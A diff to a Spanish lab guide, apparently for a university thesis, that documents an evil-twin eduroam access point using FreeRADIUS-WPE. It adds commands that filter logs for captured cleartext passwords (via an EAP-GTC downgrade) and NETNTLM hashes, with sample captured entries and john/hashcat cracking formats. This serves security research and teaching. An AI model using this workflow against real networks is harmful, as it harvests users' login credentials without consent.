@@ -19,25 +19,59 @@ sudo iw dev wlan1 info | grep -E 'ssid|channel|type'   # eduroam-tfg / 6 / AP
 ps -ef | grep -E 'hostapd|radiusd|dnsmasq' | grep -v grep
 ```
 
-## Capturar hashes en tiempo real
+## Capturar credenciales en tiempo real
+
+El laboratorio captura **dos tipos** de credenciales según el cliente
+(ver [`arquitectura.md`](arquitectura.md) §5 sobre el downgrade GTC):
 
 ```bash
-# Log principal de FreeRADIUS-WPE (entradas formato hashcat al final del archivo)
+# Log principal de FreeRADIUS-WPE: contiene tanto entradas pap: (GTC plain)
+# como mschap: (hashes NETNTLM)
 sudo tail -F /var/log/freeradius-wpe/freeradius-server-wpe.log
+```
 
-# Log del wrapper PatataWiFi (cuando uno se conecta por SSH a la Pi durante el ataque)
+### Filtros separados (terminal split)
+
+```bash
+# Terminal 1 — passwords en claro (clientes que aceptan EAP-GTC)
+sudo tail -F /var/log/freeradius-wpe/freeradius-server-wpe.log \
+  | grep --line-buffered -A2 '^pap:'
+
+# Terminal 2 — hashes NETNTLM (clientes que rechazan GTC y caen a MSCHAPv2)
+sudo tail -F /var/log/freeradius-wpe/freeradius-server-wpe.log \
+  | grep --line-buffered -A4 '^mschap:'
+```
+
+### Formato esperado
+
+Entrada GTC (password en claro):
+
+```
+pap: Wed May 27 19:14:17 2026
+    username: alice@uloyola.es
+    password: Passw0rd2026
+```
+
+Entrada MSCHAPv2 (hash crackeable offline):
+
+```
+mschap: Wed May 27 19:46:05 2026
+    username: bob@uloyola.es
+    challenge: a9:84:ee:c0:5e:92:cb:9c
+    response: dd:e0:60:31:d7:fb:10:e7:ab:db:3b:ff:b8:ba:ec:bd:5b:e2:cf:eb:18:af:f2:f2
+    john NETNTLM: bob@uloyola.es:$NETNTLM$a984eec05e92cb9c$dde06031d7fb...
+```
+
+La línea `john NETNTLM:` está lista para `john --format=netntlm`. Para
+`hashcat -m 5500` reformatear según [`analisis-offline.md`](analisis-offline.md).
+
+### Log del wrapper PatataWiFi
+
+```bash
+# (cuando se accede por SSH a la Pi durante el ataque)
 sudo tail -F /root/patatawifi/logs/PatataWifi_Hostapd/wpe.log
 sudo tail -F /root/patatawifi/logs/PatataWifi_Hostapd/auth-detail
 ```
-
-Una captura típica genera una línea similar a:
-
-```
-username::challenge:response:ntresponse
-alice@uloyola.es:0123456789abcdef:fedcba9876543210...
-```
-
-Listo para `hashcat -m 5500`. Ver [`analisis-offline.md`](analisis-offline.md).
 
 ## Limpiar y reiniciar manualmente
 
